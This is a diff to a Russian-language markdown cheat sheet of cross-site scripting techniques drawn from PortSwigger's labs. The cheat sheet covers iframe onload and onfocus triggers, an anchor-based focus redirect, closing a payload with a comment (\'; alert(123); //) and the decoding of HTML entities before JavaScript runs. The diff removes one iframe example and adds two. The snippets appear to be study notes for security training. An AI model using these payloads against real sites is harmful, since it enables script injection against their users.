@@ -17,12 +17,6 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://p
 
 ### Из PortSwigger Labs (XSS)
 
-Вызвать событие onresize для открываемой в iframe ссылке
-
-```markup
-<iframe src="https://example.com/?search=..." onload=this.style.width='100px'> 
-```
-
 Перевести фокус на элемент (и тем самым вызвать срабатывание onfocus) через якорь:
 
 ```
@@ -34,4 +28,20 @@ location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dtes
 Если по каким-то причинам мы не можем закрыть оставшуюся часть полезной нагрузки, то можно закрыть комментарием — `//`. Например: `\'; alert(123); //`.
 
 При обработке HTML-страницы сначала декодится htmlencode, затем уже интерпретируется JS-код. => можно использовать символы `&apos;` и тп, сначала декодируются они.
+
+### iframe usage example
+
+#### Изменить url при отрисовке формы
+
+```markup
+<iframe src="https://example.com/" onload="this.src += '#fragment'"></iframe>
+```
+
+Откроется iframe `https://example.com/`, после отрисовки формы пользователь будет перенаправлен на `https://example.com/#fragment`.
+
+#### Resize формы при отрисовке формы
+
+```html
+<iframe src="https://example.com/?search=" onload="this.style.width='100px'"></iframe>
+```
 
